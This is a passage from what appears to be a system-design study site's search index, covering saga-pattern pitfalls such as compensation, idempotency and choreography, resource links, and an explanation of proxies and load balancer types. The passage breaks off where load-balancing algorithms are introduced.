\u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Operation: Book hotel via API        \u2502            \u2502\n\u2502    \u2502 Compensation: Cancel booking         \u2502            \u2502\n\u2502    \u2502 \u2022 API might not support cancellation \u2502            \u2502\n\u2502    \u2502 \u2022 Cancellation fee charged           \u2502            \u2502\n\u2502    \u2502 \u2022 Not truly reversible               \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. \u274c PHYSICAL WORLD ACTIONS                            \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Operation: Print shipping label      \u2502            \u2502\n\u2502    \u2502 Operation: Dispatch drone delivery   \u2502            \u2502\n\u2502    \u2502 Operation: Cut fabric to size        \u2502            \u2502\n\u2502    \u2502 Compensation: Impossible!            \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 4. \u274c IRREVERSIBLE STATE CHANGES                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Operation: Increment sequence number \u2502            \u2502\n\u2502    \u2502 Operation: Delete old data           \u2502            \u2502\n\u2502    \u2502 Compensation: Not meaningful         \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 Solution Patterns:                                      \u2502\n\u2502 \u2022 PIVOT TRANSACTION: Point of no return                 \u2502\n\u2502   (Make non-compensatable ops last)                     \u2502\n\u2502 \u2022 SEMANTIC COMPENSATION: Apologize/explain              \u2502\n\u2502   (Send \"sorry\" email)                                  \u2502\n\u2502 \u2022 RETRY UNTIL SUCCESS: Avoid compensation               \u2502\n\u2502   (Retry forward transaction)                           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 4: Ordering and Idempotency Issues</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 4: MESSAGE ORDERING &amp; IDEMPOTENCY         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Issue 1: OUT-OF-ORDER MESSAGE DELIVERY                  \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500            \u2502\n\u2502                                                         \u2502\n\u2502 Sent Order:     [T1] \u2192 [T2] \u2192 [T3]                      \u2502\n\u2502 Received Order: [T1] \u2192 [T3] \u2192 [T2] \u274c                   \u2502\n\u2502                                                         \u2502\n\u2502 Example:                                                \u2502\n\u2502 \u2022 T1: Create order                                      \u2502\n\u2502 \u2022 T2: Update address                                    \u2502\n\u2502 \u2022 T3: Confirm order                                     \u2502\n\u2502                                                         \u2502\n\u2502 If T3 arrives before T2:                                \u2502\n\u2502 \u2022 Order confirmed with old address!                     \u2502\n\u2502 \u2022 Update arrives too late                               \u2502\n\u2502                                                         \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500             \u2502\n\u2502                                                         \u2502\n\u2502 Issue 2: DUPLICATE MESSAGE DELIVERY                     \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500            \u2502\n\u2502                                                         \u2502\n\u2502 Network retry can cause duplicates:                     \u2502\n\u2502                                                         \u2502\n\u2502 T1: Charge $100                                         \u2502\n\u2502 T1: Charge $100 (duplicate!)                            \u2502\n\u2502 Result: Charged $200 instead of $100 \u274c                 \u2502\n\u2502                                                         \u2502\n\u2502 Solution: IDEMPOTENCY                                   \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 def charge_payment(request_id, amount):  \u2502           \u2502\n\u2502 \u2502     if already_processed(request_id):    \u2502           \u2502\n\u2502 \u2502         return cached_result             \u2502           \u2502\n\u2502 \u2502     result = do_charge(amount)           \u2502           \u2502\n\u2502 \u2502     cache_result(request_id, result)     \u2502           \u2502\n\u2502 \u2502     return result                        \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Idempotency Requirements:                               \u2502\n\u2502 \u2022 Unique request IDs (correlation IDs)                  \u2502\n\u2502 \u2022 Deduplication logic                                   \u2502\n\u2502 \u2022 Idempotent operations                                 \u2502\n\u2502 \u2022 Result caching                                        \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 5: Complexity in Choreography</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 5: CHOREOGRAPHY COMPLEXITY                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Issue: Emergent workflow from distributed events        \u2502\n\u2502                                                         \u2502\n\u2502 Simple Flow (3 services):                               \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Order \u2192 Payment \u2192 Shipping               \u2502           \u2502\n\u2502 \u2502 (3 steps, easy to understand)            \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Complex Flow (10 services):                             \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502      Order                               \u2502           \u2502\n\u2502 \u2502     /  |  \\                              \u2502           \u2502\n\u2502 \u2502   Pay Inv. Fraud                         \u2502           \u2502\n\u2502 \u2502    |   |    |                            \u2502           \u2502\n\u2502 \u2502   Tax Ship Notify                        \u2502           \u2502\n\u2502 \u2502    \\   |   /                             \u2502           \u2502\n\u2502 \u2502    Analytics                             \u2502           \u2502\n\u2502 \u2502       |                                  \u2502           \u2502\n\u2502 \u2502    Billing                               \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 \u2022 10+ event types                        \u2502           \u2502\n\u2502 \u2502 \u2022 Dozens of event handlers               \u2502           \u2502\n\u2502 \u2502 \u2022 No single view of workflow             \u2502           \u2502\n\u2502 \u2502 \u2022 Distributed state machine              \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Problems:                                               \u2502\n\u2502 \u274c No central place to see workflow                     \u2502\n\u2502 \u274c Cyclic dependencies between services                 \u2502\n\u2502 \u274c Difficult to change flow                             \u2502\n\u2502 \u274c Hard to debug failures                               \u2502\n\u2502 \u274c Testing requires all services                        \u2502\n\u2502 \u274c Tight coupling via events                            \u2502\n\u2502                                                         \u2502\n\u2502 When to use Orchestration instead:                      \u2502\n\u2502 \u2022 Complex business logic                                \u2502\n\u2502 \u2022 Many conditional branches                             \u2502\n\u2502 \u2022 Need clear workflow visibility                        \u2502\n\u2502 \u2022 Frequent changes to flow                              \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Summary: Saga Pattern Trade-offs</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SAGA PATTERN: WHEN TO USE                       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 \u2705 USE SAGA WHEN:                                       \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Building microservices                 \u2502           \u2502\n\u2502 \u2502 \u2022 Need high scalability                  \u2502           \u2502\n\u2502 \u2502 \u2022 Long-running processes                 \u2502           \u2502\n\u2502 \u2502 \u2022 Eventual consistency acceptable        \u2502           \u2502\n\u2502 \u2502 \u2022 Services independently deployable      \u2502           \u2502\n\u2502 \u2502 \u2022 Can write compensating transactions    \u2502           \u2502\n\u2502 \u2502 \u2022 Cloud-native architecture              \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 \u274c DON'T USE SAGA WHEN:                                 \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Need strong consistency (ACID)         \u2502           \u2502\n\u2502 \u2502 \u2022 Isolation critical (finance)           \u2502           \u2502\n\u2502 \u2502 \u2022 Operations not compensatable           \u2502           \u2502\n\u2502 \u2502 \u2022 Simple monolith sufficient             \u2502           \u2502\n\u2502 \u2502 \u2022 Low transaction volume                 \u2502           \u2502\n\u2502 \u2502 \u2022 Real-time consistency required         \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Better Alternatives:                                    \u2502\n\u2502 \u2022 Monolith with ACID: Simple, proven                    \u2502\n\u2502 \u2022 2PC: When strong consistency needed                   \u2502\n\u2502 \u2022 Event Sourcing: Full audit trail                      \u2502\n\u2502 \u2022 CQRS: Read/write separation                           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/dns-server/","title":"Design DNS server","text":""},{"location":"system-design/high-level/concepts/dns-server/#youtube","title":"Youtube","text":"<ul> <li> <p>How DNS works? | System Design of Domain Name System</p> </li> <li> <p>Build Your Own DNS Server - Beginner Friendly</p> </li> <li>Build Your Own DNS Server</li> <li>I created an AI Based DNS Server - Toying with DNS</li> </ul>"},{"location":"system-design/high-level/concepts/dns-server/#websites","title":"Websites","text":"<ul> <li>DNS Record Types: Defined and Explained</li> </ul>"},{"location":"system-design/high-level/concepts/event-sourcing/","title":"Event Sourcing","text":""},{"location":"system-design/high-level/concepts/event-sourcing/#youtube","title":"Youtube","text":"<ul> <li>System Design - Event Sourcing</li> </ul>"},{"location":"system-design/high-level/concepts/hashing/","title":"Hashing","text":""},{"location":"system-design/high-level/concepts/hashing/#youtube","title":"Youtube","text":"<ul> <li>99% of Developers Don't Get Hashing</li> </ul>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/","title":"Load Balancers","text":""},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#youtube","title":"Youtube","text":"<ul> <li> <p>Proxy vs Reverse Proxy vs Load Balancer | Simply Explained</p> </li> <li> <p>17. Proxy vs Reverse Proxy (Example) | How Proxy differs from VPN, LoadBalancer | SystemDesign</p> </li> <li>18. Load Balancer &amp; Different Algorithms - System Design | Static &amp; Dynamic Load Balancing Algorithm</li> </ul>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#proxy-server","title":"Proxy Server","text":"<p>A proxy server is an intermediary server that sits between clients and other servers, forwarding client requests and server responses. It acts as a gateway or middleman in network communications.</p> <p>Key Characteristics: - Acts as an intermediary for requests - Can cache responses to improve performance - Can filter and modify requests/responses - Provides anonymity and access control</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#forward-proxy-server","title":"Forward Proxy Server","text":"<p>A forward proxy sits between client devices and the internet, forwarding client requests to external servers.</p> <p>How it works: 1. Client sends request to the forward proxy 2. Forward proxy forwards the request to the destination server (on behalf of the client) 3. Destination server responds to the proxy 4. Proxy returns the response to the client</p> <p>Use Cases: - Corporate networks: Control and monitor employee internet access - Content filtering: Block access to specific websites - Anonymity: Hide client IP addresses from destination servers - Caching: Store frequently accessed content to reduce bandwidth - Access control: Bypass geo-restrictions</p> <p>Example Tools: - Squid - Apache HTTP Server (mod_proxy) - HAProxy (can function as forward proxy)</p> <p>Connection to Other Concepts: - Different from Reverse Proxy: Forward proxy protects clients, reverse proxy protects servers - Similar to VPN: Both provide anonymity, but VPN encrypts all traffic while forward proxy works at application layer - Can work with Firewall: Often deployed together for network security</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#reverse-proxy-server","title":"Reverse Proxy Server","text":"<p>A reverse proxy sits in front of backend servers, receiving client requests and forwarding them to appropriate backend servers.</p> <p>How it works: 1. Client sends request to what appears to be the final server (actually the reverse proxy) 2. Reverse proxy forwards request to one of the backend servers 3. Backend server processes and responds to the proxy 4. Proxy returns the response to the client</p> <p>Use Cases: - Load distribution: Distribute traffic across multiple servers - SSL termination: Handle SSL/TLS encryption/decryption - Caching: Cache static content to reduce backend load - Security: Hide backend server details, protect from DDoS - Compression: Compress responses before sending to clients - Web acceleration: Optimize content delivery</p> <p>Example Tools: - Nginx - Apache HTTP Server (mod_proxy) - HAProxy - Traefik - Envoy</p> <p>Connection to Other Concepts: - Different from Forward Proxy: Protects servers instead of clients; clients don't need configuration - Often functions as Load Balancer: Many reverse proxies include load balancing features - Can be part of CDN: CDN edge servers act as reverse proxies - Works with Firewall: Provides additional security layer</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#load-balancer","title":"Load Balancer","text":"<p>A load balancer distributes incoming network traffic across multiple backend servers to ensure no single server bears too much load, improving application availability and responsiveness.</p> <p>How it works: 1. Client sends request to the load balancer's IP address 2. Load balancer selects a backend server using a specific algorithm 3. Request is forwarded to the selected server 4. Server processes and responds through the load balancer 5. Load balancer returns response to the client</p> <p>Types of Load Balancers:</p> <p>Load balancers can be categorized based on the OSI layer they operate on and their deployment model.</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#1-network-load-balancer-nlb-layer-4","title":"1. Network Load Balancer (NLB) - Layer 4","text":"<p>Description: - Operates at the Transport Layer (Layer 4) of the OSI model - Routes traffic based on IP protocol data (IP address and TCP/UDP ports) - Does NOT inspect application content (HTTP headers, URLs, cookies) - Extremely fast and can handle millions of requests per second</p> <p>How it works: 1. Receives TCP/UDP packets 2. Examines source/destination IP and port 3. Uses hash or connection tracking to select backend server 4. Forwards packets to selected server (NAT or DSR mode) 5. Maintains minimal state, often just connection table</p> <p>Characteristics: - Performance: Ultra-low latency (microseconds), high throughput - Protocol Support: Any TCP/UDP protocol (HTTP, HTTPS, SMTP, FTP, custom protocols) - Static IP: Provides static IP address (important for DNS) - Connection-based: Preserves client IP address - TLS Termination: Can do TLS passthrough or termination (limited)</p> <p>Use Cases: - High-performance applications requiring millions of requests/second - Non-HTTP protocols (databases, gaming servers, IoT) - Volatile workloads with sudden traffic spikes - When you need static IP addresses - WebSocket connections and long-lived TCP connections</p> <p>Examples: - AWS Network Load Balancer (NLB) - Azure Load Balancer - Google Cloud Network Load Balancer - HAProxy in TCP mode</p> <p>Advantages: - \u2705 Extremely fast and high throughput - \u2705 Lower cost (less processing) - \u2705 Protocol-agnostic (works with any TCP/UDP) - \u2705 Preserves source IP address - \u2705 Lower latency</p> <p>Disadvantages: - \u274c No content-based routing - \u274c No URL-based routing or host-based routing - \u274c Limited SSL/TLS capabilities - \u274c No HTTP header manipulation - \u274c Cannot make intelligent decisions based on application data</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#2-application-load-balancer-alb-layer-7","title":"2. Application Load Balancer (ALB) - Layer 7","text":"<p>Description: - Operates at the Application Layer (Layer 7) of the OSI model - Understands HTTP/HTTPS protocols and can inspect request content - Makes routing decisions based on URL paths, hostnames, headers, methods, query strings - Terminates and re-creates connections (proxy mode)</p> <p>How it works: 1. Receives HTTP/HTTPS request 2. Terminates client connection (SSL offloading if HTTPS) 3. Inspects URL path, headers, cookies, query parameters 4. Routes to appropriate target group based on routing rules 5. Creates new connection to backend server 6. Returns response to client</p> <p>Characteristics: - Content-aware: Routes based on URL, headers, methods - SSL Termination: Handles SSL/TLS encryption/decryption - HTTP/2 &amp; WebSocket: Full support for modern protocols - Sticky Sessions: Cookie-based session affinity - Health Checks: Application-level health checks (HTTP status codes)</p> <p>Routing Capabilities: - Path-based: Route <code>/api/*</code> to API servers, <code>/images/*</code> to image servers - Host-based: Route <code>api.example.com</code> and <code>www.example.com</code> to different targets - Header-based: Route based on User-Agent (mobile vs desktop) - Query-based: Route based on query parameters - Method-based: Different routing for GET, POST, PUT, DELETE</p> <p>Use Cases: - Microservices architectures (route to different services based on path) - Multi-tenant applications (route by hostname) - A/B testing (route based on headers/cookies) - Mobile vs web traffic routing - API gateways - Modern web applications with complex routing needs</p> <p>Examples: - AWS Application Load Balancer (ALB) - Azure Application Gateway - Google Cloud HTTP(S) Load Balancer - HAProxy in HTTP mode - Nginx</p> <p>Advantages: - \u2705 Advanced routing based on application content - \u2705 SSL/TLS termination (reduces backend load) - \u2705 Better for microservices and containerized apps - \u2705 Cookie-based sticky sessions - \u2705 HTTP/2 and WebSocket support - \u2705 Application-level health checks - \u2705 WAF integration for security</p> <p>Disadvantages: - \u274c Higher latency than NLB (content inspection overhead) - \u274c Lower throughput compared to NLB - \u274c More expensive (more processing required) - \u274c HTTP/HTTPS only (not for other protocols) - \u274c Doesn't preserve client IP (uses X-Forwarded-For header)</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#3-classic-load-balancer-clb-layer-4-7","title":"3. Classic Load Balancer (CLB) - Layer 4 &amp; 7","text":"<p>Description: - Legacy load balancer type (AWS specific, but concept exists elsewhere) - Can operate at both Layer 4 and Layer 7 - Basic load balancing across EC2 instances - Being replaced by NLB and ALB in modern architectures</p> <p>Characteristics: - Simple round-robin or least-connections routing - Basic health checks - SSL termination support - Less features than ALB/NLB</p> <p>Use Cases: - Legacy applications - Simple load balancing needs - When migrating from older infrastructure</p> <p>Status: - AWS recommends migrating to ALB or NLB - Not recommended for new deployments</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#4-gateway-load-balancer-gwlb","title":"4. Gateway Load Balancer (GWLB)","text":"<p>Description: - Operates at Layer 3 (Network Layer) - Designed for deploying, scaling, and managing third-party virtual appliances - Combines transparent network gateway + load balancer</p> <p>How it works: 1. Traffic enters GWLB 2. Distributes traffic to fleet of virtual appliances (firewalls, IDS/IPS) 3. Appliances inspect/process traffic 4. GWLB returns traffic to original flow</p> <p>Use Cases: - Deploy firewalls, IDS/IPS, DPI tools at scale - Network security appliances - Traffic inspection and monitoring</p> <p>Examples: - AWS Gateway Load Balancer - Used with Palo Alto, Fortinet, Check Point appliances</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#5-global-load-balancer-gslb","title":"5. Global Load Balancer (GSLB)","text":"<p>Description: - DNS-based load balancing across geographic regions - Routes users to nearest or best-performing data center - Disaster recovery and multi-region failover</p> <p>How it works: 1. User queries DNS for <code>www.example.com</code> 2. GSLB returns IP of nearest/healthiest data center 3. User connects to that data center 4. Local load balancer distributes within data center</p> <p>Use Cases: - Multi-region deployments - Global applications - Disaster recovery - Geographic traffic steering</p> <p>Examples: - AWS Route 53 with health checks - Azure Traffic Manager - Google Cloud Global Load Balancer - Cloudflare Load Balancing - F5 BIG-IP DNS</p> <p>Advantages: - \u2705 Geographic distribution - \u2705 Disaster recovery - \u2705 Reduced latency (route to nearest region) - \u2705 Cross-region failover</p> <p>Disadvantages: - \u274c DNS caching can delay failover - \u274c Less granular than application-level LB - \u274c Depends on DNS TTL</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#comparison-nlb-vs-alb","title":"Comparison: NLB vs ALB","text":"Feature Network LB (L4) Application LB (L7) Layer Transport (Layer 4) Application (Layer 7) Protocols TCP, UDP, TLS HTTP, HTTPS, HTTP/2, WebSocket Routing IP + Port URL, headers, cookies, query params Performance Ultra-high (millions RPS) High (thousands RPS) Latency Microseconds Milliseconds SSL Termination TLS passthrough Full SSL offloading Sticky Sessions IP-based Cookie-based Health Checks TCP/UDP ping HTTP status codes, response content Client IP Preserved Via X-Forwarded-For header Use Cases Gaming, IoT, databases Web apps, microservices, APIs Cost Lower Higher <p>When to use NLB: - Need extreme performance (millions of connections) - Non-HTTP protocols - Require static IP - Minimal latency critical - Preserve source IP address</p> <p>When to use ALB: - HTTP/HTTPS applications - Microservices architecture - Content-based routing needed - SSL termination required - Modern web applications</p> <p>Load Balancing Algorithms:</p> <p>Load balancing algorithms determine how traffic is distributed across backend servers. They fall into two categories: Static (predetermined logic) and Dynamic (runtime decisions based on server 